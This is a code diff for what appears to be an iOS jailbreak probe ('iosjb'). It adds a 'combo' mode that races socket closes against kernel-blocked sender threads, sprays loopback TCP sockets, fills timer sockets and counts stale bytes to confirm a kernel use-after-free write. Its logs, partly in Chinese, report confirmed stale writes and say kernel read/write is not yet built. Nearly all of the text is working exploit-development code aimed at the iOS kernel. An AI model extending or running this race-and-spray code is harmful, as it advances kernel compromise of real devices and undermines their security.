@@ -137,6 +137,11 @@ static int connect_loopback(uint16_t port) {
     value = 3;
     setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT, &value, sizeof(value));
     value = 1;
+    // The public iOS 27 harness sets option 0x100 on its race sockets.
+    // On Darwin headers this is TCP_RXT_FINDROP; keep the same teardown
+    // behavior for the timer variant.
+    setsockopt(fd, IPPROTO_TCP, 0x100, &value, sizeof(value));
+    value = 1;
     setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &value, sizeof(value));
 
     value = 262144;
@@ -267,6 +272,113 @@ static void close_array(int *fds, int count) {
             fds[index] = -1;
         }
     }
+}
+
+static int start_sender_threads(int senders) {
+    pthread_mutex_lock(&g_gate.mutex);
+    g_gate.senders = senders;
+    g_gate.entered = 0;
+    g_gate.done = 0;
+    g_gate.generation = 0;
+    g_gate.target_fd = -1;
+    pthread_mutex_unlock(&g_gate.mutex);
+
+    for (int index = 0; index < senders; index++) {
+        pthread_t worker;
+        if (pthread_create(&worker, NULL, sender_worker, NULL) != 0) {
+            log_message("[!] 发送线程 %d 创建失败", index);
+            atomic_store(&g_config.stop, 1);
+            return -1;
+        }
+        pthread_detach(worker);
+    }
+    return 0;
+}
+
+static void stop_sender_threads(void) {
+    atomic_store(&g_config.stop, 1);
+    pthread_mutex_lock(&g_gate.mutex);
+    pthread_cond_broadcast(&g_gate.condition);
+    pthread_mutex_unlock(&g_gate.mutex);
+}
+
+static int collect_spray_result(int listener, uint16_t port, int spray_count,
+                                int senders) {
+    int spray_fds[IOSJB_MAX_SPRAY];
+    int spray_peers[IOSJB_MAX_SPRAY];
+    for (int index = 0; index < IOSJB_MAX_SPRAY; index++) {
+        spray_fds[index] = -1;
+        spray_peers[index] = -1;
+    }
+
+    int created = 0;
+    for (int index = 0; index < spray_count; index++) {
+        int spray_fd = connect_loopback(port);
+        if (spray_fd < 0) {
+            break;
+        }
+        int peer = accept(listener, NULL, NULL);
+        if (peer < 0) {
+            close(spray_fd);
+            break;
+        }
+        spray_fds[created] = spray_fd;
+        spray_peers[created] = peer;
+        created += 1;
+    }
+
+    uint8_t contention_byte = 0x42;
+    for (int index = 0; index < created; index++) {
+        for (int attempt = 0; attempt < 3; attempt++) {
+            (void)send(spray_fds[index], &contention_byte, 1,
+                       MSG_DONTWAIT | MSG_NOSIGNAL);
+        }
+    }
+
+    wait_for_done(senders);
+    usleep(150);
+
+    int received = 0;
+    for (int index = 0; index < created; index++) {
+        received += peer_bytes(spray_peers[index]);
+    }
+
+    close_array(spray_fds, created);
+    close_array(spray_peers, created);
+
+    int baseline = created * 3;
+    if (received <= baseline) {
+        return 0;
+    }
+    int stale = received - baseline;
+    return stale > 512 ? stale : 0;
+}
+
+static int race_target(int target_fd, int close_delay_us, int listener,
+                       uint16_t port, int spray_count, int senders) {
+    pthread_mutex_lock(&g_gate.mutex);
+    g_gate.target_fd = target_fd;
+    g_gate.entered = 0;
+    g_gate.done = 0;
+    g_gate.generation += 1;
+    pthread_cond_broadcast(&g_gate.condition);
+    pthread_mutex_unlock(&g_gate.mutex);
+
+    int entered = wait_for_entered(senders);
+    if (entered < senders) {
+        log_message("[!] 只有 %d/%d 个发送线程进入内核", entered, senders);
+    }
+    if (close_delay_us > 0) {
+        usleep((useconds_t)close_delay_us);
+    }
+    close(target_fd);
+
+    int stale = collect_spray_result(listener, port, spray_count, senders);
+
+    pthread_mutex_lock(&g_gate.mutex);
+    g_gate.target_fd = -1;
+    pthread_mutex_unlock(&g_gate.mutex);
+    return stale;
 }
 
 static int run_oracle(int iterations, int senders, int spray_count,
@@ -432,6 +544,188 @@ static int run_oracle(int iterations, int senders, int spray_count,
     return hits;
 }
 
+static void fill_timer_socket(int fd) {
+    uint8_t payload[2048];
+    memset(payload, 0x5a, sizeof(payload));
+    for (int attempt = 0; attempt < 512; attempt++) {
+        ssize_t result = send(fd, payload, sizeof(payload),
+                              MSG_DONTWAIT | MSG_NOSIGNAL);
+        if (result < 0) {
+            break;
+        }
+    }
+}
+
+static int run_combo(int iterations, int senders, int spray_count,
+                     int close_delay_us) {
+    enum { TIMER_COUNT = 64, MULTI_COUNT = 8 };
+    uint16_t port = 0;
+    int listener = make_listener(&port);
+    if (listener < 0) {
+        log_message("[!] 监听 Socket 创建失败：%s", strerror(errno));
+        return -1;
+    }
+
+    log_message("[组合] 端口=%u 发送线程=%d 喷射数=%d 迭代=%d 延迟=%d 微秒",
+                port, senders, spray_count, iterations, close_delay_us);
+    if (start_sender_threads(senders) != 0) {
+        close(listener);
+        return -1;
+    }
+
+    int timer_fds[TIMER_COUNT];
+    int timer_peers[TIMER_COUNT];
+    for (int index = 0; index < TIMER_COUNT; index++) {
+        timer_fds[index] = -1;
+        timer_peers[index] = -1;
+    }
+
+    int timer_count = 0;
+    for (int index = 0; index < TIMER_COUNT; index++) {
+        int fd = connect_loopback(port);
+        if (fd < 0) {
+            break;
+        }
+        int peer = accept(listener, NULL, NULL);
+        if (peer < 0) {
+            close(fd);
+            break;
+        }
+        fill_timer_socket(fd);
+        timer_fds[index] = fd;
+        timer_peers[index] = peer;
+        timer_count += 1;
+    }
+    log_message("[组合] Timer Socket 池=%d", timer_count);
+
+    int hits = 0;
+    int total_stale_bytes = 0;
+    int completed = 0;
+
+    for (int iteration = 0; iteration < iterations; iteration++) {
+        if (atomic_load(&g_config.stop)) {
+            break;
+        }
+
+        int variant = iteration % 3;
+        const char *variant_name = variant == 0
+            ? "精确"
+            : (variant == 1 ? "多 FD" : "TCP Timer");
+        int target_fd = -1;
+        int target_peer = -1;
+        int extras[MULTI_COUNT];
+        int extra_peers[MULTI_COUNT];
+        for (int index = 0; index < MULTI_COUNT; index++) {
+            extras[index] = -1;
+            extra_peers[index] = -1;
+        }
+
+        if (variant == 0) {
+            target_fd = connect_loopback(port);
+            if (target_fd >= 0) {
+                target_peer = accept(listener, NULL, NULL);
+                if (target_peer < 0) {
+                    close(target_fd);
+                    target_fd = -1;
+                }
+            }
+        } else if (variant == 1) {
+            int created = 0;
+            for (int index = 0; index < MULTI_COUNT; index++) {
+                int fd = connect_loopback(port);
+                if (fd < 0) {
+                    break;
+                }
+                int peer = accept(listener, NULL, NULL);
+                if (peer < 0) {
+                    close(fd);
+                    break;
+                }
+                extras[created] = fd;
+                extra_peers[created] = peer;
+                created += 1;
+            }
+            if (created < 6) {
+                close_array(extras, MULTI_COUNT);
+                close_array(extra_peers, MULTI_COUNT);
+                continue;
+            }
+            for (int index = 0; index < created; index += 2) {
+                close(extras[index]);
+                close(extra_peers[index]);
+                extras[index] = -1;
+                extra_peers[index] = -1;
+            }
+            target_fd = extras[1];
+            target_peer = extra_peers[1];
+            extras[1] = -1;
+            extra_peers[1] = -1;
+        } else if (timer_count > 0) {
+            int index = iteration % timer_count;
+            target_fd = timer_fds[index];
+            target_peer = timer_peers[index];
+            timer_fds[index] = -1;
+            timer_peers[index] = -1;
+
+            int replacement_fd = connect_loopback(port);
+            if (replacement_fd >= 0) {
+                int replacement_peer = accept(listener, NULL, NULL);
+                if (replacement_peer >= 0) {
+                    fill_timer_socket(replacement_fd);
+                    timer_fds[index] = replacement_fd;
+                    timer_peers[index] = replacement_peer;
+                } else {
+                    close(replacement_fd);
+                }
+            }
+        }
+
+        if (target_fd < 0) {
+            close_array(extras, MULTI_COUNT);
+            close_array(extra_peers, MULTI_COUNT);
+            continue;
+        }
+
+        int stale_bytes = race_target(target_fd, close_delay_us, listener, port,
+                                      spray_count, senders);
+        if (target_peer >= 0) {
+            close(target_peer);
+        }
+        close_array(extras, MULTI_COUNT);
+        close_array(extra_peers, MULTI_COUNT);
+
+        if (stale_bytes > 0) {
+            hits += 1;
+            total_stale_bytes += stale_bytes;
+            log_message("[!] STALE WRITE CONFIRMED / 已确认陈旧写入："
+                        "迭代=%d 变体=%s 净字节=%d",
+                        iteration, variant_name, stale_bytes);
+        }
+
+        completed = iteration + 1;
+        if (iteration % 50 == 0 || stale_bytes > 0) {
+            log_message("[组合] 进度 %d/%d 变体=%s 命中=%d 陈旧字节=%d",
+                        completed, iterations, variant_name, hits,
+                        total_stale_bytes);
+        }
+        usleep(200);
+    }
+
+    close_array(timer_fds, TIMER_COUNT);
+    close_array(timer_peers, TIMER_COUNT);
+    stop_sender_threads();
+    close(listener);
+
+    log_message("[组合] 完成：尝试=%d 命中=%d 陈旧字节=%d",
+                completed, hits, total_stale_bytes);
+    if (hits == 0) {
+        log_message("[组合] 未观察到陈旧数据投递，不能据此判断设备安全");
+    } else {
+        log_message("[组合] 已观察到内核 stale write；受控内核读写尚未实现");
+    }
+    return hits;
+}
+
 static int ool_spray(uint64_t fill, int count) {
     uint8_t *buffer = malloc(IOSJB_OOL_SIZE);
     if (buffer == NULL) {
@@ -579,6 +873,11 @@ static void *run_worker(void *context) {
                             g_config.senders,
                             g_config.spray_count,
                             g_config.close_delay_us);
+    } else if (g_config.mode == IOSJB_MODE_COMBO) {
+        result = run_combo(g_config.iterations,
+                           g_config.senders,
+                           g_config.spray_count,
+                           g_config.close_delay_us);
     } else if (g_config.mode == IOSJB_MODE_RECLAIM) {
         result = run_reclaim_probe();
     } else {
@@ -602,7 +901,9 @@ int32_t iosjb_start(int32_t mode,
         log_message("[!] 已有探针正在运行");
         return -1;
     }
-    if (mode != IOSJB_MODE_ORACLE && mode != IOSJB_MODE_RECLAIM) {
+    if (mode != IOSJB_MODE_ORACLE &&
+        mode != IOSJB_MODE_RECLAIM &&
+        mode != IOSJB_MODE_COMBO) {
         return -1;
     }
 
@@ -637,6 +938,6 @@ int32_t iosjb_is_running(void) {
 }
 
 const char *iosjb_version(void) {
-    return "0.1.2";
+    return "0.1.3";
 }
 
